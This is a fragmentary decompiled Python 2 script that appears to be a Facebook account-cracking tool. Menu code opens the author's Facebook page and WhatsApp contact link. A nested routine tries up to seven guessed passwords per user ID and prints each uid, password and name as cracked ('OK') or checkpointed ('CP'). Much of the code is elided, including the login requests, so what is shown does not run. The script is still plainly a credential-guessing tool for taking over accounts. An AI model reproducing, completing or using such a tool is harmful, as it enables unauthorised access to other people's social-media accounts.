...
# File: Awaiseshal.pyc (Python 2.7)

#Decompile by Awais ka Papa Furqan
...
def main_select():
    ...
    if AWAIS == '':
        ...
        os.system('xdg-open https://www.facebook.com/dinesh.maeel.7')

        main()

    elif AWAIS == '3':

        os.system('xdg-open https://api.whatsapp.com/send/?phone=%2B9203181941179&text&app_absent=0')
...
def log_select():
    ...
    if sel == '2':
        ...
        os.system('python2 Awaiseshal.py')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ...
                        print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ...
                            print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            ...
                            if 'access_token' in q:
                                ...
                                print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ...
                                print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ...
                                    print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;92m[AWAIS-ESHAL-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ...
                                        print '\x1b[1;93m[AWAIS-ESHAL-CP] ' + uid + ' | ' + pass7 + ' | ' + name
